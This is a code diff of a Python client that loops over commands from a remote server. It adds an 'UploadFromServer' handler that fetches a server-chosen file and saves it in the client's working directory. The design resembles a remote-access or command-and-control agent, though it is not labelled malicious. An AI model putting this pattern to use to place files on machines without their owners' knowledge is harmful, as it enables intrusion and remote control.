@@ -199,6 +199,35 @@ while True:
                 else:
                     print(f"Failed to download file. Server responded with status code {response.status_code}")
 
+
+            elif command.startswith('{"command": "UploadFromServer"'):
+                command_data = json.loads(command)
+                command=""
+                client_id = command_data["client_id"]
+                server_file_path_for_client = command_data["server_file_path"]
+                response = requests.get(f"{SERVER_URL}/api/upload-file-to-client?clientID={client_id}&server_file_path_from_client={server_file_path_for_client}", timeout=5)
+                # Check if the response is successful
+                if response.status_code == 200:
+                    filename = os.path.basename(server_file_path_for_client)
+                    file_path = os.path.join(current_directory, filename)
+                    
+                    # Save the file
+                    with open(file_path, "wb") as file:
+                        file.write(response.content)
+                        print("file saved")
+                    print(f"File '{filename}' saved successfully in {current_directory}")
+                else:
+                    print(f"Failed to download file. Server responded with status code {response.status_code}")
+
+
+
+
+
+
+
+
+
+                
             elif command.startswith("download"):
                 _, file_path = command.split(" ", 1)
                 full_file_path = os.path.join(current_directory,file_path)
